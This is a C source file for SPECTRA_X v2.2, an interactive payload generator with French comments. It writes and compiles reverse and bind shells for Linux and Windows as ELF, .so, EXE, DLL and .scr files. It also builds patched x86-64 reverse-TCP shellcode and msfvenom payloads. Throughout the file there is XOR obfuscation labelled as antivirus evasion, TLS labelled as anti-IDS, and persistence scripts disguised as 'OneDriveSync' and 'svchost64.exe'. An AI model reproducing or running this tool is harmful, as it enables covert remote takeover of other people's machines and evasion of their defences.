/*
 * SPECTRA_X v2.2 - Générateur de payloads Linux/Windows
 * Formats : ELF (std/static/strip/.so) | EXE (console/hidden), DLL, SCR
 * Options  : XOR AV-evasion, shellcode brut, SSL/TLS,
 *            persistance (OPT-IN, OFF par défaut), choix du shell
 * Compile  : gcc SPECTRA_X.c -o SPECTRA_X
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/stat.h>

#define BUF 256
#define XOR_KEY 0x5A

/* Codes de format */
#define FMT_ELF_STD    1   /* ELF standard            */
#define FMT_ELF_STATIC 2   /* ELF statique            */
#define FMT_ELF_STRIP  3   /* ELF strip               */
#define FMT_SO         4   /* Shared object (.so)     */
#define FMT_EXE_CON    1   /* EXE console             */
#define FMT_EXE_HIDE   2   /* EXE fenêtre cachée      */
#define FMT_DLL        3   /* DLL (DllMain + thread)  */
#define FMT_SCR        4   /* Screensaver (.scr)      */

/* ═══════════════ Utilitaires ═══════════════ */

void clear_stdin(void) { int c; while ((c = getchar()) != '\n' && c != EOF); }

int ip_valide(const char *ip) {
    int a, b, c, d; char extra;
    if (sscanf(ip, "%d.%d.%d.%d%c", &a, &b, &c, &d, &extra) != 4) return 0;
    return (a >= 0 && a <= 255 && b >= 0 && b <= 255 &&
            c >= 0 && c <= 255 && d >= 0 && d <= 255);
}

void demander_cible(char *ip, int *port) {
    char pb[16];
    while (1) {
        printf("  [?] IP (LHOST) : ");
        if (scanf("%255s", ip) != 1) { clear_stdin(); continue; }
        if (ip_valide(ip)) break;
        printf("  [!] IP invalide (format x.x.x.x)\n");
    }
    clear_stdin();
    while (1) {
        printf("  [?] Port (LPORT) : ");
        if (!fgets(pb, sizeof(pb), stdin)) continue;
        pb[strcspn(pb, "\n")] = '\0';
        if (!strlen(pb)) continue;
        *port = atoi(pb);
        if (*port > 0 && *port <= 65535) break;
        printf("  [!] Port invalide (1-65535)\n");
    }
}

int confirmer_persistance(void) {
    char r[8];
    printf("  [!] PERSISTANCE : installe un mécanisme de démarrage automatique\n");
    printf("      (cron @reboot / clé Run). Désactivable facilement après coup.\n");
    printf("  [?] Activer la persistance ? (o/N) : ");
    if (!fgets(r, sizeof(r), stdin)) return 0;
    return (r[0] == 'o' || r[0] == 'O' || r[0] == 'y' || r[0] == 'Y');
}

/* ═══════════════ Émission XOR ═══════════════ */

void emit_xor_blob(FILE *f, const char *plain) {
    size_t n = strlen(plain), i;
    fprintf(f, "#define XK 0x%02X\n", XOR_KEY);
    fprintf(f, "static char sh[] = {");
    for (i = 0; i <= n; i++)
        fprintf(f, "%s0x%02X", i ? "," : "", (unsigned char)plain[i] ^ XOR_KEY);
    fprintf(f, ",0x00};\n");
    fprintf(f, "static void xdec(void){size_t i;for(i=0;i<sizeof(sh)-1;i++)sh[i]^=XK;}\n");
}

/* ═══════════════ Menu format de sortie ═══════════════ */

int menu_format(int is_windows) {
    char line[16];
    int c;
    while (1) {
        printf("\n  ── Format de sortie ──\n");
        if (is_windows) {
            printf("  [1] .exe console (classique)\n");
            printf("  [2] .exe fenêtre cachée (-mwindows)\n");
            printf("  [3] .dll (DllMain + thread, exécution au chargement)\n");
            printf("  [4] .scr screensaver (exe renommé, lancement double-clic)\n");
        } else {
            printf("  [1] ELF standard\n");
            printf("  [2] ELF statique (-static, portable sans libs)\n");
            printf("  [3] ELF strip (-s, symboles retirés)\n");
            printf("  [4] Shared object .so (LD_PRELOAD / dlopen)\n");
        }
        printf("  [0] Annuler\n");
        printf("  [?] Choix : ");
        if (!fgets(line, sizeof(line), stdin)) continue;
        c = atoi(line);
        if (c >= 0 && c <= 4) return c;
        printf("  [!] Choix invalide\n");
    }
}

/* ═══════════════ Compilation selon format ═══════════════ */

void compile_linux(const char *src, const char *out, int fmt, int ssl) {
    char cmd[768];
    switch (fmt) {
        case FMT_ELF_STATIC:
            snprintf(cmd, sizeof(cmd), "gcc %s -o %s -static %s 2>/dev/null",
                     src, out, ssl ? "-lssl -lcrypto" : "");
            break;
        case FMT_ELF_STRIP:
            snprintf(cmd, sizeof(cmd), "gcc %s -o %s -s %s 2>/dev/null",
                     src, out, ssl ? "-lssl -lcrypto" : "");
            break;
        case FMT_SO:
            snprintf(cmd, sizeof(cmd), "gcc %s -o %s.so -shared -fPIC %s 2>/dev/null",
                     src, out, ssl ? "-lssl -lcrypto" : "");
            break;
        default: /* FMT_ELF_STD */
            snprintf(cmd, sizeof(cmd), "gcc %s -o %s %s 2>/dev/null",
                     src, out, ssl ? "-lssl -lcrypto" : "");
    }
    if (system(cmd) == 0) {
        if (fmt == FMT_SO) printf("  [+] Compilé : %s.so\n", out);
        else               printf("  [+] Compilé : %s\n", out);
    } else {
        printf("  [~] Compilation échouée%s\n",
               ssl ? " (libssl-dev requis : sudo apt install libssl-dev)" : "");
    }
}

void compile_windows(const char *src, const char *out, int fmt) {
    char cmd[768];
    switch (fmt) {
        case FMT_DLL:
            snprintf(cmd, sizeof(cmd),
                "x86_64-w64-mingw32-gcc %s -o %s.dll -shared -lws2_32 2>/dev/null", src, out);
            break;
        case FMT_EXE_HIDE:
            snprintf(cmd, sizeof(cmd),
                "x86_64-w64-mingw32-gcc %s -o %s.exe -lws2_32 -mwindows 2>/dev/null", src, out);
            break;
        default:
            snprintf(cmd, sizeof(cmd),
                "x86_64-w64-mingw32-gcc %s -o %s.exe -lws2_32 2>/dev/null", src, out);
    }
    if (system(cmd) != 0) {
        printf("  [~] mingw absent — source utilisable (sudo apt install mingw-w64)\n");
        return;
    }
    if (fmt == FMT_DLL) {
        printf("  [+] Compilé : %s.dll (se charge via rundll32, regsvr32 ou loader)\n", out);
    } else if (fmt == FMT_SCR) {
        /* .scr = exe renommé */
        char mv[512];
        snprintf(mv, sizeof(mv), "mv %s.exe %s.scr 2>/dev/null", out, out);
        if (system(mv) == 0)
            printf("  [+] Compilé : %s.scr (screensaver — Windows l'exécute en plein écran)\n", out);
        else
            printf("  [+] Compilé : %s.exe (renomme en .scr manuellement)\n", out);
    } else {
        printf("  [+] Compilé : %s.exe\n", out);
    }
}

/* ═══════════════ Payloads Linux ═══════════════ */

void gen_lin_rev(const char *ip, int port, const char *shell,
                 int xor, int ssl, int fmt) {
    FILE *f = fopen("lin_rev.c", "w");
    if (!f) { printf("  [!] Erreur écriture lin_rev.c\n"); return; }

    fprintf(f, "/* lin_rev.c - reverse shell Linux (SPECTRA_X v2.2) */\n");
    fprintf(f, "/* shell=%s xor=%s ssl=%s fmt=%d */\n",
            shell, xor ? "ON" : "OFF", ssl ? "ON" : "OFF", fmt);
    fprintf(f, "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n"
               "#include <string.h>\n#include <signal.h>\n"
               "#include <arpa/inet.h>\n#include <sys/socket.h>\n");
    if (ssl) fprintf(f, "#include <openssl/ssl.h>\n#include <openssl/err.h>\n");

    if (xor) emit_xor_blob(f, shell);
    else     fprintf(f, "static char sh[] = \"%s\";\n", shell);

    /* Corps commun : boucle payload dans une fonction */
    fprintf(f, "static void payload_loop(void){\n  signal(SIGCHLD, SIG_IGN);\n");
    if (xor) fprintf(f, "  xdec();\n");
    fprintf(f, "  while(1){\n"
               "    int s = socket(AF_INET, SOCK_STREAM, 0);\n"
               "    if (s < 0){ sleep(5); continue; }\n"
               "    struct sockaddr_in a;\n"
               "    a.sin_family = AF_INET;\n"
               "    a.sin_port = htons(%d);\n"
               "    a.sin_addr.s_addr = inet_addr(\"%s\");\n", port, ip);

    if (ssl) {
        fprintf(f,
"    if (connect(s,(struct sockaddr*)&a,sizeof(a)) == 0) {\n"
"      SSL_load_error_strings(); SSL_library_init();\n"
"      SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());\n"
"      SSL *ssl = SSL_new(ctx);\n"
"      SSL_set_fd(ssl, s);\n"
"      if (SSL_connect(ssl) == 1) {\n"
"        int p2c[2], c2p[2]; pipe(p2c); pipe(c2p);\n"
"        pid_t pid = fork();\n"
"        if (pid == 0) {\n"
"          close(p2c[1]); close(c2p[0]);\n"
"          dup2(p2c[0],0); dup2(c2p[1],1); dup2(c2p[1],2);\n"
"          char *env[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",NULL};\n"
"          char *av[] = {sh, NULL};\n"
"          execve(sh, av, env); _exit(1);\n"
"        }\n"
"        close(p2c[0]); close(c2p[1]);\n"
"        int mx = (c2p[0] > s ? c2p[0] : s) + 1;\n"
"        char b[4096];\n"
"        while (1) {\n"
"          fd_set r; FD_ZERO(&r); FD_SET(c2p[0],&r); FD_SET(s,&r);\n"
"          if (select(mx,&r,NULL,NULL,NULL) <= 0) continue;\n"
"          if (FD_ISSET(s,&r)) { int n = SSL_read(ssl,b,sizeof(b)); if(n<=0) break; if (write(p2c[1],b,n)<0) break; }\n"
"          if (FD_ISSET(c2p[0],&r)) { int n = read(c2p[0],b,sizeof(b)); if(n<=0) break; SSL_write(ssl,b,n); }\n"
"        }\n"
"        kill(pid, SIGKILL);\n"
"      }\n"
"      SSL_shutdown(ssl); SSL_free(ssl); SSL_CTX_free(ctx);\n"
"    }\n");
    } else {
        fprintf(f,
"    if (connect(s,(struct sockaddr*)&a,sizeof(a)) == 0) {\n"
"      dup2(s,0); dup2(s,1); dup2(s,2);\n"
"      char *env[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",NULL};\n"
"      char *av[] = {sh, NULL};\n"
"      execve(sh, av, env);\n"
"      close(s);\n"
"    }\n");
    }

    fprintf(f, "    close(s);\n    sleep(5);\n  }\n}\n");

    /* Point d'entrée selon le format */
    if (fmt == FMT_SO) {
        /* .so : constructeur exécuté au chargement (LD_PRELOAD/dlopen).
           fork() pour ne pas bloquer le processus hôte. */
        fprintf(f,
"__attribute__((constructor))\n"
"static void spectra_init(void){\n"
"  if (fork() == 0) { setsid(); payload_loop(); _exit(0); }\n"
"}\n");
    } else {
        fprintf(f, "int main(void){ payload_loop(); return 0; }\n");
    }

    fclose(f);
    printf("  [+] Source générée : lin_rev.c\n");
    compile_linux("lin_rev.c", "lin_rev", fmt, ssl);
}

void gen_lin_bind(int port, const char *shell, int xor, int fmt) {
    FILE *f = fopen("lin_bind.c", "w");
    if (!f) return;
    fprintf(f, "/* lin_bind.c - bind shell Linux (SPECTRA_X v2.2) */\n");
    fprintf(f, "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n"
               "#include <string.h>\n#include <arpa/inet.h>\n#include <sys/socket.h>\n");
    if (xor) emit_xor_blob(f, shell);
    else     fprintf(f, "static char sh[] = \"%s\";\n", shell);

    fprintf(f, "static void payload_loop(void){\n");
    if (xor) fprintf(f, "  xdec();\n");
    fprintf(f,
"  int srv = socket(AF_INET, SOCK_STREAM, 0), opt = 1;\n"
"  setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n"
"  struct sockaddr_in a;\n"
"  a.sin_family = AF_INET; a.sin_addr.s_addr = INADDR_ANY;\n"
"  a.sin_port = htons(%d);\n"
"  bind(srv,(struct sockaddr*)&a,sizeof(a));\n"
"  listen(srv,1);\n"
"  int c = accept(srv,NULL,NULL);\n"
"  dup2(c,0); dup2(c,1); dup2(c,2);\n"
"  char *env[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",NULL};\n"
"  char *av[] = {sh, NULL};\n"
"  execve(sh, av, env);\n}\n", port);

    if (fmt == FMT_SO) {
        fprintf(f,
"__attribute__((constructor))\n"
"static void spectra_init(void){\n"
"  if (fork() == 0) { setsid(); payload_loop(); _exit(0); }\n"
"}\n");
    } else {
        fprintf(f, "int main(void){ payload_loop(); return 0; }\n");
    }

    fclose(f);
    printf("  [+] Source générée : lin_bind.c\n");
    compile_linux("lin_bind.c", "lin_bind", fmt, 0);
}

/* ═══════════════ Payloads Windows ═══════════════ */

void gen_win_rev(const char *ip, int port, const char *shell, int xor, int fmt) {
    FILE *f = fopen("win_rev.c", "w");
    if (!f) return;
    fprintf(f, "/* win_rev.c - reverse shell Windows (SPECTRA_X v2.2, fmt=%d) */\n", fmt);
    fprintf(f, "#include <winsock2.h>\n#include <windows.h>\n#include <string.h>\n\n");
    if (xor) emit_xor_blob(f, shell);
    else     fprintf(f, "static char sh[] = \"%s\";\n", shell);

    fprintf(f, "static DWORD WINAPI payload_thread(LPVOID arg){\n"
               "  (void)arg;\n");
    if (xor) fprintf(f, "  xdec();\n");
    fprintf(f,
"  WSADATA w; SOCKET s; struct sockaddr_in a;\n"
"  STARTUPINFO si; PROCESS_INFORMATION pi;\n"
"  while (1) {\n"
"    WSAStartup(MAKEWORD(2,2), &w);\n"
"    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
"    a.sin_family = AF_INET;\n"
"    a.sin_port = htons(%d);\n"
"    a.sin_addr.s_addr = inet_addr(\"%s\");\n"
"    if (WSAConnect(s,(SOCKADDR*)&a,sizeof(a),NULL,NULL,NULL,NULL) == 0) {\n"
"      memset(&si,0,sizeof(si)); si.cb = sizeof(si);\n"
"      si.dwFlags = STARTF_USESTDHANDLES;\n"
"      si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;\n"
"      if (CreateProcessA(NULL, sh, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {\n"
"        WaitForSingleObject(pi.hProcess, INFINITE);\n"
"        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);\n"
"      }\n"
"      closesocket(s);\n"
"    } else { closesocket(s); Sleep(5000); }\n"
"    WSACleanup();\n  }\n"
"  return 0;\n}\n", port, ip);

    if (fmt == FMT_DLL) {
        fprintf(f,
"BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r){\n"
"  (void)h; (void)r;\n"
"  if (reason == DLL_PROCESS_ATTACH)\n"
"    CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);\n"
"  return TRUE;\n}\n");
    } else {
        fprintf(f, "int main(void){\n"
                   "  HANDLE t = CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);\n"
                   "  if (t) WaitForSingleObject(t, INFINITE);\n"
                   "  return 0;\n}\n");
    }

    fclose(f);
    printf("  [+] Source générée : win_rev.c\n");
    compile_windows("win_rev.c", "win_rev", fmt);
}

void gen_win_bind(int port, const char *shell, int xor, int fmt) {
    FILE *f = fopen("win_bind.c", "w");
    if (!f) return;
    fprintf(f, "/* win_bind.c - bind shell Windows (SPECTRA_X v2.2, fmt=%d) */\n", fmt);
    fprintf(f, "#include <winsock2.h>\n#include <windows.h>\n#include <string.h>\n\n");
    if (xor) emit_xor_blob(f, shell);
    else     fprintf(f, "static char sh[] = \"%s\";\n", shell);

    fprintf(f, "static DWORD WINAPI payload_thread(LPVOID arg){\n  (void)arg;\n");
    if (xor) fprintf(f, "  xdec();\n");
    fprintf(f,
"  WSADATA w; SOCKET s, c; struct sockaddr_in a;\n"
"  STARTUPINFO si; PROCESS_INFORMATION pi;\n"
"  WSAStartup(MAKEWORD(2,2), &w);\n"
"  s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
"  a.sin_family = AF_INET; a.sin_addr.s_addr = INADDR_ANY;\n"
"  a.sin_port = htons(%d);\n"
"  bind(s,(SOCKADDR*)&a,sizeof(a)); listen(s,1);\n"
"  c = accept(s,NULL,NULL);\n"
"  memset(&si,0,sizeof(si)); si.cb = sizeof(si);\n"
"  si.dwFlags = STARTF_USESTDHANDLES;\n"
"  si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)c;\n"
"  if (CreateProcessA(NULL, sh, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {\n"
"    WaitForSingleObject(pi.hProcess, INFINITE);\n"
"    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);\n"
"  }\n"
"  return 0;\n}\n", port);

    if (fmt == FMT_DLL) {
        fprintf(f,
"BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r){\n"
"  (void)h; (void)r;\n"
"  if (reason == DLL_PROCESS_ATTACH)\n"
"    CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);\n"
"  return TRUE;\n}\n");
    } else {
        fprintf(f, "int main(void){\n"
                   "  HANDLE t = CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);\n"
                   "  if (t) WaitForSingleObject(t, INFINITE);\n"
                   "  return 0;\n}\n");
    }

    fclose(f);
    printf("  [+] Source générée : win_bind.c\n");
    compile_windows("win_bind.c", "win_bind", fmt);
}

/* ═══════════════ Shellcode brut ═══════════════ */

void gen_lin_shellcode(const char *ip, int port) {
    unsigned char sc[] = {
        0x48,0x31,0xff,0x6a,0x09,0x58,0x99,0xb6,0x10,0x48,0x89,0xf6,0x48,0x31,0xd2,0xf2,
        0xd0,0x48,0x31,0xc0,0x50,0x47,0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x6a,
        0x02,0x48,0x89,0xe7,0x48,0x31,0xf6,0x99,0x0f,0x05,0x48,0x97,0x48,0xb9,0x02,0x00,
        0x1f,0x90,0x7f,0x00,0x00,0x01,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,0x29,0x58,
        0x0f,0x05,0x6a,0x03,0x5e,0x48,0xff,0xce,0x78,0x0b,0x48,0x31,0xc0,0x6a,0x21,0x58,
        0x0f,0x05,0x48,0x3d,0x01,0xff,0xff,0xff,0x75,0xf0,0x6a,0x3b,0x58,0x99,0x48,0xbb,
        0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x52,0x57,0x48,0x89,
        0xe6,0x0f,0x05
    };
    unsigned char mark[8] = {0x02,0x00,0x1f,0x90,0x7f,0x00,0x00,0x01};
    int off = -1, i;
    int a, b, c, d;

    for (i = 0; i < (int)sizeof(sc) - 8; i++)
        if (!memcmp(sc + i, mark, 8)) { off = i; break; }
    if (off < 0) { printf("  [!] Erreur interne : marqueur sockaddr introuvable\n"); return; }

    sc[off + 2] = (unsigned char)((port >> 8) & 0xff);
    sc[off + 3] = (unsigned char)(port & 0xff);
    if (sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d) != 4) {
        printf("  [!] IP invalide pour le shellcode\n");
        return;
    }
    sc[off + 4] = (unsigned char)a;
    sc[off + 5] = (unsigned char)b;
    sc[off + 6] = (unsigned char)c;
    sc[off + 7] = (unsigned char)d;

    FILE *fb = fopen("lin_sc.bin", "wb");
    if (!fb) { printf("  [!] Erreur écriture lin_sc.bin\n"); return; }
    fwrite(sc, 1, sizeof(sc), fb);
    fclose(fb);

    FILE *fc = fopen("lin_sc.c", "w");
    if (!fc) { printf("  [!] Erreur écriture lin_sc.c\n"); return; }
    fprintf(fc, "/* lin_sc.c - shellcode reverse TCP x86-64 -> %s:%d (%zu octets) */\n",
            ip, port, sizeof(sc));
    fprintf(fc, "unsigned char sc[] = {\n");
    for (i = 0; i < (int)sizeof(sc); i++) {
        fprintf(fc, "0x%02x%s", sc[i], (i + 1 < (int)sizeof(sc)) ? "," : "");
        if ((i + 1) % 12 == 0) fprintf(fc, "\n");
    }
    fprintf(fc, "\n};\nunsigned int sc_len = sizeof(sc);\n");
    fclose(fc);

    printf("  [+] Shellcode brut : lin_sc.bin (%zu octets, x86-64 Linux)\n", sizeof(sc));
    printf("  [+] Version C      : lin_sc.c (tableau injectable)\n");
    printf("  [*] Handler        : nc -lvnp %d\n", port);
}

void gen_win_shellcode(const char *ip, int port) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=%s LPORT=%d "
        "-f c -o win_sc.c >/dev/null 2>&1", ip, port);
    printf("  [*] Génération via msfvenom (windows/x64/shell_reverse_tcp)...\n");
    if (system(cmd) == 0 && access("win_sc.c", F_OK) == 0) {
        printf("  [+] Shellcode C généré : win_sc.c\n");
    } else {
        printf("  [~] msfvenom absent. Commande à lancer manuellement :\n\n");
        printf("      msfvenom -p windows/x64/shell_reverse_tcp LHOST=%s LPORT=%d -f c -o win_sc.c\n\n", ip, port);
    }
}

/* ═══════════════ Persistance (scripts séparés, OPT-IN) ═══════════════ */

void gen_persist_linux(const char *binname) {
    FILE *f = fopen("install_persist.sh", "w");
    if (!f) return;
    fprintf(f,
"#!/bin/bash\n"
"# install_persist.sh — persistance cron @reboot (à lancer MANUELLEMENT)\n"
"# Désinstallation : crontab -e puis retirer la ligne @reboot\n"
"DEST=\"$HOME/.config/.sysupdate\"\n"
"cp -f ./%s \"$DEST\" && chmod +x \"$DEST\"\n"
"(crontab -l 2>/dev/null | grep -v sysupdate ; echo \"@reboot $DEST\") | crontab -\n"
"echo \"[+] Persistance cron installée : $DEST\"\n", binname);
    fclose(f);
    chmod("install_persist.sh", 0755);
    printf("  [+] Script persistance généré : install_persist.sh (à lancer MANUELLEMENT)\n");
    printf("  [*] Désinstallation : crontab -e → supprimer la ligne @reboot\n");
}

void gen_persist_win(const char *binname) {
    FILE *f = fopen("install_persist.bat", "w");
    if (!f) return;
    fprintf(f,
"@echo off\n"
"rem install_persist.bat — persistance clé Run HKCU (à lancer MANUELLEMENT)\n"
"rem Désinstallation : reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v OneDriveSync /f\n"
"copy /Y %s.exe \"%%APPDATA%%\\svchost64.exe\"\n"
"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v OneDriveSync /t REG_SZ /d \"%%APPDATA%%\\svchost64.exe\" /f\n"
"echo [+] Persistance Run installee\n", binname);
    fclose(f);
    printf("  [+] Script persistance généré : install_persist.bat (à lancer MANUELLEMENT)\n");
    printf("  [*] Désinstallation : reg delete ... /v OneDriveSync /f\n");
}

/* ═══════════════ Menu options ═══════════════ */

int menu_options(int is_linux, char *shell, int *xor, int *ssl, int *persist) {
    const char *shells_lin[] = { "/bin/sh", "/bin/bash" };
    const char *shells_win[] = { "cmd.exe", "powershell.exe -NoP -NonI -W Hidden" };
    const char *shells[2];
    int n = 2, cur = 0;
    char line[16];
    int i;

    shells[0] = is_linux ? shells_lin[0] : shells_win[0];
    shells[1] = is_linux ? shells_lin[1] : shells_win[1];
    strcpy(shell, shells[0]);

    while (1) {
        printf("\n  ── Options du payload ──\n");
        printf("  [1] Shell           : %s   (toggle)\n", shell);
        printf("  [2] Obfuscation XOR : %s\n", *xor ? "ON " : "OFF");
        if (is_linux)
            printf("  [3] SSL/TLS         : %s   (anti-IDS)\n", *ssl ? "ON " : "OFF");
        printf("  [4] Persistance     : %s   (OFF par défaut)\n", *persist ? "ON " : "OFF");
        printf("  [g] Générer le payload\n");
        printf("  [0] Annuler\n");
        printf("  [?] Choix : ");
        if (!fgets(line, sizeof(line), stdin)) continue;
        line[strcspn(line, "\n")] = '\0';

        if (line[0] == 'g' || line[0] == 'G') return 1;
        if (line[0] == '0') return 0;

        i = atoi(line);
        switch (i) {
            case 1:
                cur = (cur + 1) % n;
                strcpy(shell, shells[cur]);
                break;
            case 2:
                *xor = !*xor;
                break;
            case 3:
                if (is_linux) *ssl = !*ssl;
                else printf("  [!] SSL/TLS non supporté sur Windows dans cette version\n");
                break;
            case 4:
                *persist = confirmer_persistance();
                if (*persist)
                    printf("  [!] Persistance ACTIVÉE — script d'installation généré séparément\n");
                break;
            default:
                printf("  [!] Choix invalide\n");
        }
    }
}

/* ═══════════════ Banner + main ═══════════════ */

void banner(void) {
    printf("\n");
    printf("  ╔══════════════════════════════════════════════════╗\n");
    printf("  ║            S P E C T R A - X   v2.2              ║\n");
    printf("  ║  XOR | Shellcode | SSL | Persistance | Formats   ║\n");
    printf("  ╚══════════════════════════════════════════════════╝\n\n");
    printf("  [1] Linux   - Reverse Shell      [5] Linux   - Shellcode brut\n");
    printf("  [2] Linux   - Bind Shell         [6] Windows - Shellcode (msfvenom)\n");
    printf("  [3] Windows - Reverse Shell\n");
    printf("  [4] Windows - Bind Shell         [0] Quitter\n\n");
}

int main(void) {
    char ip[BUF], shell[BUF];
    int port, choix, xor, ssl, persist, fmt;

    banner();
    while (1) {
        printf("  [?] Ton choix : ");
        if (scanf("%d", &choix) != 1) { clear_stdin(); printf("  [!] Invalide\n"); continue; }
        clear_stdin();
        if (choix == 0) { printf("\n  [*] À bientôt !\n\n"); break; }
        if (choix < 1 || choix > 6) { printf("  [!] Invalide\n\n"); continue; }

        printf("\n  ── Configuration ──\n");

        /* Shellcode : pas de menu options ni format */
        if (choix == 5 || choix == 6) {
            demander_cible(ip, &port);
            printf("\n");
            if (choix == 5) gen_lin_shellcode(ip, port);
            else            gen_win_shellcode(ip, port);
            continue;
        }

        xor = 0; ssl = 0; persist = 0;
        demander_cible(ip, &port);
        if (!menu_options(choix <= 2, shell, &xor, &ssl, &persist)) { printf("\n"); continue; }

        fmt = menu_format(choix >= 3);
        if (fmt == 0) { printf("\n"); continue; }
        printf("\n");

        switch (choix) {
            case 1:
                gen_lin_rev(ip, port, shell, xor, ssl, fmt);
                printf("  [*] Handler : nc -lvnp %d  (ou socat OpenSSL pour le mode TLS)\n", port);
                if (persist) gen_persist_linux("lin_rev");
                break;
            case 2:
                gen_lin_bind(port, shell, xor, fmt);
                printf("  [*] Connexion : nc <IP_cible> %d\n", port);
                if (persist) gen_persist_linux("lin_bind");
                break;
            case 3:
                gen_win_rev(ip, port, shell, xor, fmt);
                printf("  [*] Handler : nc -lvnp %d\n", port);
                if (persist) gen_persist_win("win_rev");
                break;
            case 4:
                gen_win_bind(port, shell, xor, fmt);
                printf("  [*] Connexion : nc <IP_cible> %d\n", port);
                if (persist) gen_persist_win("win_bind");
                break;
        }
        printf("\n");
    }
    return 0;
}